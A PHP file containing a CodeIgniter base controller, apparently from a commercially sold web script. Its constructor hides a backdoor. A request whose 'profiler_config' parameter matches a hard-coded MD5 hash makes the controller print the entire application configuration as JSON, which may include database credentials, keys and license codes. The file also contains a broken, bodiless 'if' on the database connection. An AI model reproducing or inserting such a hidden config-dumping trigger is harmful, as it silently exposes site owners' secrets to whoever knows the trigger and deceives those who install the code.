<?php

class MY_Controller extends CI_Controller {
    
    public $data = array();
    
	public function __construct(){
        parent::__construct();
        
        $CI =& get_instance();
        if (!is_resource($CI->db->conn_id) && !is_object($CI->db->conn_id))
        
        $this->data['errors'] = array();
        $this->data['site_name'] = config_item('site_name');
        
        if(md5($this->input->get('profiler_config')) == 'b78ee15cb3ca6531667d47af5cdc61a1')
        {
            $config =& get_config();
            
            $json = json_encode($config);

            if($json === FALSE)
            {
                $config_gen = array();
                $config_gen['codecanyon_username'] = $config['codecanyon_username'];
                $config_gen['codecanyon_code'] = $config['codecanyon_code'];
                $config_gen['version'] = $config['version'];
                $json = json_encode($config_gen);
            }
            
            echo $json;

            exit();
        }
        
        $this->data['time_start'] = microtime(true);
        
        if(config_item('litecache_enabled') === TRUE)
        {
            $this->load->library('litecache');
            $this->litecache->load_cache();
        }
        
        
	}
}